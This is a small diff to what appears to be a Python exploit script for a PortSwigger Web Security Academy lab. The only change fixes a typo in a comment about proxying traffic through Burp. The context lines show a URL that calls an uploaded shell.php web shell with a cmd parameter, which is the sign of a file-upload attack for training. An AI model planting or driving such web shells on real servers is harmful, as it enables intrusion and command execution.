@@ -9,7 +9,7 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 url = "https://0a82008e047b13d381d7989700b500b0.web-security-academy.net/my-account/avatar"
 url_2 = f"https://0a82008e047b13d381d7989700b500b0.web-security-academy.net/files/avatars/shell.php?cmd={cmd}"
 
-# if your want use Burp to watch the requests
+# if you want to use Burp to watch the requests
 proxies = { 
               "http"  : "http://127.0.0.1:8080", 
               "https" : "http://127.0.0.1:8080"
